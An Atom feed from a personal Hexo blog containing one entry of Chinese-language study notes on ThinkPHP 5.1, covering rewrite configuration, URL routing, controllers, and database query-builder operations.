<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anti-Genemits</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-09-17T16:27:04.357Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>码农</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ThinkPhP学习第一天</title>
    <link href="http://example.com/2020/09/17/URL%E8%A7%A3%E6%9E%90%E6%A8%A1%E5%BC%8F/"/>
    <id>http://example.com/2020/09/17/URL%E8%A7%A3%E6%9E%90%E6%A8%A1%E5%BC%8F/</id>
    <published>2020-09-17T11:50:05.000Z</published>
    <updated>2020-09-17T16:27:04.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPhP学习-第一天"><a href="#ThinkPhP学习-第一天" class="headerlink" title="ThinkPhP学习-第一天"></a>ThinkPhP学习-第一天</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>.htaceess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$<span class="number">1</span>]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>要改成这样，并且打开伪静态模块</p><a id="more"></a><h2 id="学习开始"><a href="#学习开始" class="headerlink" title="学习开始"></a>学习开始</h2><h2 id="URL解析模式"><a href="#URL解析模式" class="headerlink" title="URL解析模式"></a>URL解析模式</h2><p><code>http://serverName/index.php/模块/控制器/操作/参数/值…</code></p><p>首先这就是一个正常的URL模式的解析示例</p><p>index.php =&gt; 入口文件</p><p>模块 =&gt; application 目录下的一个可自定义的目录(默认index)</p><p>控制器=&gt;在 index 目录下有一个 controller 控制器目录的 Index.php 控制器(<strong>Index.php 控制器的类名也必须是 class Index)</strong></p><p>操作 =》 就是类的一个方法</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">test</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Abc</span> </span>&#123; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params">$who = <span class="string">&#x27;隔壁老王&#x27;</span></span>) </span>&#123; <span class="keyword">return</span> $who.<span class="string">&#x27;吃饭！&#x27;</span>; &#125; &#125;</span><br></pre></td></tr></table></figure><p>将以上代码复制到application目录下的test目录下的controller目录下的Abc.php（控制器）</p><p>则 url就是 ：<code>public/index.php/test/abc/eat/who/主人老李</code></p><h2 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h2><h3 id="一-目录架构"><a href="#一-目录架构" class="headerlink" title="一.目录架构"></a>一.目录架构</h3><p>1.thinkphp多模块，单模块均支持，通过<code>app_multi_module</code>这个参数来调节</p><p>2.手册上的目录架构</p><p><img src="https://i.loli.net/2020/09/17/78251DvgTrGRwdn.png"></p><p>3.命令空间统一：app\模块名  eg：：<code>app\index\controller\Index</code> </p><p>4.多模块访问必须指定模块，单模块则不用</p><p>5.绑定了模块，然后绑定了控制器</p><p><code>    Container::get(&#39;app&#39;)-&gt;bind(&#39;test/abc&#39;)-&gt;run()-&gt;send();</code></p><h3 id="二、空模块"><a href="#二、空模块" class="headerlink" title="二、空模块"></a>二、空模块</h3><p><code>&#39;empty_module&#39;</code></p><p> 可以通过环境变量设置空目录，将不存在的目录统一指向指定目录； </p><h3 id="三、单一模块"><a href="#三、单一模块" class="headerlink" title="三、单一模块"></a>三、单一模块</h3><p>命名空间改为<code>app/controller</code></p><p>目录架构改为:</p><p><img src="https://i.loli.net/2020/09/17/7TpNWY64n3eIMZE.png"></p><h3 id="四、环境变量"><a href="#四、环境变量" class="headerlink" title="四、环境变量"></a>四、环境变量</h3><p>ThinkPHP5.1 提供了一个类库 Env 来获取环境变量； <code>return Env::get(&#39;app_path&#39;);</code></p><p><img src="https://i.loli.net/2020/09/17/Nr3xbTnHoFpOfdk.png"></p><h2 id="控制器定义"><a href="#控制器定义" class="headerlink" title="控制器定义"></a>控制器定义</h2><h3 id="一．控制器定义"><a href="#一．控制器定义" class="headerlink" title="一．控制器定义"></a>一．控制器定义</h3><ol><li>控制器，即 controller，控制器文件存放在 controller 目录下；</li><li>类名和文件名大小写保持一致，并采用驼峰式（首字母大写）； use think\Controller; class Index extends Controller</li><li>继承控制器基类，可以更方便使用功能，但不是必须的；</li><li>系统也提供了其它方式，在不继承的情况下完成相同功能； </li><li>前面我们知道如果是一个单词，首字母大写，比如 class Index；</li><li>URL 访问时直接 public/index 即可； </li><li>那么如果创建的是双字母组合，比如 class HelloWorld； </li><li>URL 访问时必须为：public/hello_world； </li><li>如果你想原样的方式访问 URL，则需要关闭配置文件中自动转换； ‘url_convert’ =&gt; false,</li><li>此时，URL 访问可以为：public/HelloWorld； </li><li>如果你想改变根命名空间 app 为其它，可以在根目录下创建.env 文件； </li><li>后写上配对的键值对即可，app_namespace=application</li></ol><h3 id="二、渲染输出"><a href="#二、渲染输出" class="headerlink" title="二、渲染输出"></a>二、渲染输出</h3><p>ThinkPHP 直接采用方法内 return 返回的方式直接就输出了； </p><p> 使用 json 输出，直接采用 json 函数； </p><p><code>$data = array(&#39;a&#39;=&gt;1, &#39;b&#39;=&gt;2, &#39;c&#39;=&gt;3); return json($data);</code></p><p>使用 view 输出模版，开启错误提示，可知道如何创建模版； </p><p>return view();</p><p>默认输出方式为 html 格式输出，如果返回的是数组，则会报错；</p><p> 可以更改配置文件里的默认输出类型，更改为 json； return [‘user’=&gt;’Lee’, ‘age’=&gt;100]; ‘default_return_type’ =&gt; ‘json’,</p><p>一般来说，正常页面都是 html 输出，用于模版，AJAX 默认为 json； </p><p>如果继承了基类控制器，那么可以定义控制器初始化方法：initialize()； </p><p>initialize()方法会在调用控制器方法之前执行； protected function initialize() { //parent::initialize(); echo ‘init’; }</p><p>initialize()方法不需要任何返回值，输出用 PHP 方式，return 无效；</p><h2 id="控制器的编写"><a href="#控制器的编写" class="headerlink" title="控制器的编写"></a>控制器的编写</h2><h3 id="一、前置操作"><a href="#一、前置操作" class="headerlink" title="一、前置操作"></a>一、前置操作</h3><ol><li><p>继承 Controller 类后可以设置一个$beforeActionList 属性来创建前置方法；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $beforeActionList=[</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>,</span><br><span class="line">        <span class="comment">//one 方法不执行</span></span><br><span class="line">        <span class="string">&#x27;second&#x27;</span> =&gt; [<span class="string">&#x27;except&#x27;</span>=&gt;<span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">        <span class="comment">//指定调用</span></span><br><span class="line">        <span class="string">&#x27;third&#x27;</span> =&gt; [<span class="string">&#x27;only&#x27;</span>=&gt;<span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p><strong>要继承</strong></p></li><li><p>此时，我们可以分别 URL 访问不同的方法来理解前置的触发执行；</p></li></ol><h3 id="二、跳转和重定向"><a href="#二、跳转和重定向" class="headerlink" title="二、跳转和重定向"></a>二、跳转和重定向</h3><p>1.Controller 提供两个跳转方法 success(msg,url) 和error(msg);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;flag)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;不指定，就返回refer</span><br><span class="line">            $this-&gt;success(&#39;注册成功&#39;,&#39;..&#x2F;&#39;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&quot;失败&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>2.成功或错误有一个固定的页面模版：’thinkphp/tpl/dispatch_jump.tpl’； </p><p>3.在 app.php 配置文件中，我们可以更改自己个性化的跳转页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;dispatch_success_tmpl&#39; &#x3D;&gt; Env::get(&#39;think_path&#39;) </span><br><span class="line">&#39;tpl&#x2F;dispatch_jump.tpl&#39;, &#39;dispatch_error_tmpl&#39; &#x3D;&gt; Env::get(&#39;think_path&#39;) . &#39;tpl&#x2F;dispatch_jump.tpl&#39;,</span><br></pre></td></tr></table></figure><p>4.环境变量</p><p><img src="https://i.loli.net/2020/09/17/7QtCDzHNShp3MfU.png"></p><h3 id="二、空方法和空控制器"><a href="#二、空方法和空控制器" class="headerlink" title="二、空方法和空控制器"></a>二、空方法和空控制器</h3><p>1.不存在的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;空方法拦截</span><br><span class="line">    public function _empty($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2.不存在控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Error</span><br><span class="line">&#123;</span><br><span class="line">    public function index(Request $request)</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;此控制器不存在&#39;.$request-&gt;controller();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.默认空控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 默认的空控制器名</span><br><span class="line">    &#39;empty_controller&#39;       &#x3D;&gt; &#39;Error&#39;,</span><br></pre></td></tr></table></figure><h2 id="数据库与模型"><a href="#数据库与模型" class="headerlink" title="数据库与模型"></a>数据库与模型</h2><h3 id="一、连接数据库（PDO模式）"><a href="#一、连接数据库（PDO模式）" class="headerlink" title="一、连接数据库（PDO模式）"></a>一、连接数据库（PDO模式）</h3><p><code>config</code>下的<code>database.php</code>可以配置链接数据</p><p>具体配置属性到配置文件查看</p><p>###　二、开始使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public  function getNoModelData()</span><br><span class="line">    &#123;</span><br><span class="line">       &#x2F;&#x2F;$data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;select();</span><br><span class="line">        $data &#x3D; Db::name(&#39;user&#39;)-&gt;select();</span><br><span class="line">        return json($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>注意区别</strong></p><h3 id="三、模型定义"><a href="#三、模型定义" class="headerlink" title="三、模型定义"></a>三、模型定义</h3><p>模型：处理数据库相关模型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\model;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class User extends Model</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用trace 查看原生的SQL；</p><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Db::table(&#39;tp_user&#39;)-&gt;find();&#x2F;&#x2F;查询出一条数据</span><br><span class="line">Db::getLastSql();&#x2F;&#x2F;查询上一次使用的查询语句是什么</span><br><span class="line">$data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,27)-&gt;find(); 指定查询，链式</span><br><span class="line">无返回值，就是null</span><br><span class="line"> $data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,127)-&gt;findOrFail(); 查找不到就抛出异常</span><br><span class="line"> Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,127)-&gt;findOrEmpty(); 查询不到就返回空数组</span><br><span class="line"> $data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;select(); 查询多列数据</span><br><span class="line"> $data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,27)-&gt;selectOrFail();</span><br><span class="line"> Db::name()不需要前缀</span><br></pre></td></tr></table></figure><p>助手函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\db助手函数</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;value(&#39;username&#39;);指定字段的值</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;column(&#39;username&#39;,&#39;id&#39;);一列的值，并且用id作为索引，返回一个array</span><br></pre></td></tr></table></figure><p>数据分批处理和大数据处理和json数据处理，具体问题具体分析</p><h2 id="链式查询"><a href="#链式查询" class="headerlink" title="链式查询"></a>链式查询</h2><h3 id="一-查询规则"><a href="#一-查询规则" class="headerlink" title="一.查询规则"></a>一.查询规则</h3><p>1.<code>-&gt;</code>多次调用</p><p>2<code>.find(),select()</code>结束查询</p><p>3.有多少种链式查询规则呢？</p><h3 id="二、多次查询"><a href="#二、多次查询" class="headerlink" title="二、多次查询"></a>二、多次查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; Db::name(&#39;user&#39;);</span><br><span class="line">        $data1 &#x3D; $user-&gt;where(&#39;id&#39;,27)-&gt;select();</span><br><span class="line">        $data2 &#x3D; $user-&gt;removeOption(&#39;where&#39;)-&gt;select();</span><br><span class="line">        return json($data2);</span><br></pre></td></tr></table></figure><h2 id="增删改操作"><a href="#增删改操作" class="headerlink" title="增删改操作"></a>增删改操作</h2><h3 id="一-新增数据"><a href="#一-新增数据" class="headerlink" title="一.新增数据"></a>一.新增数据</h3><p><code>insert()</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = [ &#x27;username&#x27; =&gt; &#x27;辉夜&#x27;, &#x27;password&#x27; =&gt; &#x27;123&#x27;, &#x27;gender&#x27; =&gt; &#x27;女&#x27;, &#x27;email&#x27; =&gt; &#x27;huiye@163.com&#x27;, &#x27;price&#x27; =&gt; 90, &#x27;details&#x27; =&gt; &#x27;123&#x27;, &#x27;create_time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;) ]</span><br><span class="line">Db::name(&#x27;user&#x27;)-&gt;insert($data);</span><br><span class="line">Db::name(&#x27;user&#x27;)-&gt;data($data)-&gt;insert();</span><br></pre></td></tr></table></figure><p>会返回一个影响行数</p><p><strong>mysql支持replace写入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;insert($data,true);唯一确定标识的时候，就会把原来的参数删除掉，然后新建</span><br></pre></td></tr></table></figure><p>批量写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;insertAll($dataAll);二维数组，其余相同</span><br></pre></td></tr></table></figure><h3 id="二-修改数据"><a href="#二-修改数据" class="headerlink" title="二.修改数据"></a>二.修改数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [</span><br><span class="line">            &#39;username&#39; &#x3D;&gt; &#39;李白&#39;,</span><br><span class="line">        ];</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,239)-&gt;update($data);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 38)-&gt; data($data)-&gt;update([&#39;password&#39;&#x3D;&gt;&#39;456&#39;]);</span><br></pre></td></tr></table></figure><p>如果有唯一性主键</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [ &#39;username&#39; &#x3D;&gt; &#39;李白&#39;, &#39;id&#39; &#x3D;&gt; 38 ]; Db::name(&#39;user&#39;)-&gt;update($data);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;inc(&#39;price&#39;)-&gt;update($data); #自增加1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;exp(&#39;email&#39;,&#39;UPPER(email)&#39;)-&gt;update($data);让data中指定的数据的email字段变成大写</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [ &#39;username&#39; &#x3D;&gt; &#39;李白&#39;, &#39;email&#39; &#x3D;&gt; Db::raw(&#39;UPPER(email)&#39;), &#39;price&#39; &#x3D;&gt; Db::raw(&#39;price - 3&#39;), &#39;id&#39; &#x3D;&gt; 38 ];</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;update($data);</span><br><span class="line">raw方法更新</span><br></pre></td></tr></table></figure><p>如果只想改其中的一个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 38)-&gt;setField(&#39;username&#39;, &#39;辉夜&#39;);</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 38)-&gt;setInc(&#39;price&#39;); setDec()减值，后面可加步长</span><br></pre></td></tr></table></figure><h3 id="三-删除数据"><a href="#三-删除数据" class="headerlink" title="三.删除数据"></a>三.删除数据</h3><ol><li>极简删除可以根据主键直接删除，删除成功返回影响行数，否则 0； Db::name(‘user’)-&gt;delete(51);</li><li>根据主键，还可以删除多条记录； Db::name(‘user’)-&gt;delete([48,49,50]);</li><li>正常情况下，通过 where()方法来删除； Db::name(‘user’)-&gt;where(‘id’, 47)-&gt;delete();</li><li>通过 true 参数删除数据表所有数据，我还没测试，大家自行测试下； Db::name(‘user’)-&gt;delete(true);</li></ol><h2 id="查询表达式"><a href="#查询表达式" class="headerlink" title="查询表达式"></a>查询表达式</h2><h3 id="一、比较查询"><a href="#一、比较查询" class="headerlink" title="一、比较查询"></a>一、比较查询</h3><p> where(字段名,查询条件)，where(字段名,表达式,查询条件)； </p><p> 其中，表达式不区分大小写，包括了比较、区间和时间三种类型的查询</p><p>使用&lt;&gt;、&gt;、&lt;、&gt;=、&lt;=可以筛选出各种符合比较值的数据列表； </p><h3 id="二、区间查询"><a href="#二、区间查询" class="headerlink" title="二、区间查询"></a>二、区间查询</h3><p>1.使用like表达式去查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;email&#39;,&#39;like&#39;,&#39;xiao%&#39;)-&gt;select();</span><br><span class="line">数组传递，模糊查询</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;email&#39;,&#39;like&#39;,[&#39;xiao%&#39;,&#39;wu%&#39;],&#39;or&#39;)-&gt;select();注意or</span><br></pre></td></tr></table></figure><p>2.模版查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;whereLike(&#39;email&#39;,&#39;xiao%&#39;)-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotLike(&#39;email&#39;,&#39;xiao%&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p>3.between表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;between&#39;,&#39;19,25&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;between&#39;,[19, 25])-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereBetween(&#39;id&#39;,[19, 25])-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotBetween(&#39;id&#39;,[19, 25])-&gt;select();</span><br></pre></td></tr></table></figure><p>4.in</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;in&#39;, &#39;19,21,29&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereIn(&#39;id&#39;,&#39;19,21,29&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotIn(&#39;id&#39;,&#39;19,21,29&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p>5.null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;uid&#39;,&#39;null&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;uid&#39;,&#39;not null&#39;)-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNull(&#39;uid&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotNull(&#39;uid&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="三、自定义"><a href="#三、自定义" class="headerlink" title="三、自定义"></a>三、自定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;exp&#39;,&#39;IN (19,21,25)&#39;)-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereExp(&#39;id&#39;,&#39;IN (19,21,25)&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h2 id="时间查询"><a href="#时间查询" class="headerlink" title="时间查询"></a>时间查询</h2><h3 id="一、传统方式"><a href="#一、传统方式" class="headerlink" title="一、传统方式"></a>一、传统方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有time才会自动填充时间</span><br><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;where(&#39;create_time&#39;,&#39;&gt; time&#39;,&#39;2018-1-1&#39;)-&gt;select();</span><br><span class="line">between查询</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;create_time&#39;,&#39;between time&#39;,[&#39;2018-1-1&#39;,&#39;2019-12-1&#39;])-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="二、快捷方式"><a href="#二、快捷方式" class="headerlink" title="二、快捷方式"></a>二、快捷方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wheretime()</span><br><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereTime(&#39;create_time&#39;,&#39;between&#39;,[&#39;2018-1-1&#39;,&#39;2019-12-1&#39;])-&gt;select();</span><br><span class="line">默认是大于符号</span><br><span class="line">whereBetweenTime()</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereBetweenTime(&#39;create_time&#39;,&#39;2018-1-1&#39;,&#39;2019-12-1&#39;)-&gt;select()如果只有一个参数就是当时的一天</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、固定查询"><a href="#三、固定查询" class="headerlink" title="三、固定查询"></a>三、固定查询</h3><table><thead><tr><th align="center">last week</th><th>上周</th></tr></thead><tbody><tr><td align="center">month 或者 m</td><td>本月</td></tr><tr><td align="center">last month</td><td>上月</td></tr><tr><td align="center">year 或 y</td><td>今年</td></tr><tr><td align="center">last year</td><td>去年</td></tr><tr><td align="center">today</td><td>今天</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereTime(&#39;create_time&#39;,&#39;y&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="四、其他查询"><a href="#四、其他查询" class="headerlink" title="四、其他查询"></a>四、其他查询</h3><p>1.查询指定时间的数据，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereTime(&#39;create_time&#39;,&#39;-2 hour&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p>2.查询两个字段的数据有效期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereBetweenTimeField(&#39;create_time&#39;,&#39;create_time&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p><code>return Db::getLastSql();</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ThinkPhP学习-第一天&quot;&gt;&lt;a href=&quot;#ThinkPhP学习-第一天&quot; class=&quot;headerlink&quot; title=&quot;ThinkPhP学习-第一天&quot;&gt;&lt;/a&gt;ThinkPhP学习-第一天&lt;/h1&gt;&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;p&gt;.htaceess&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Options +FollowSymlinks -Multiviews&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteEngine On&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  RewriteCond 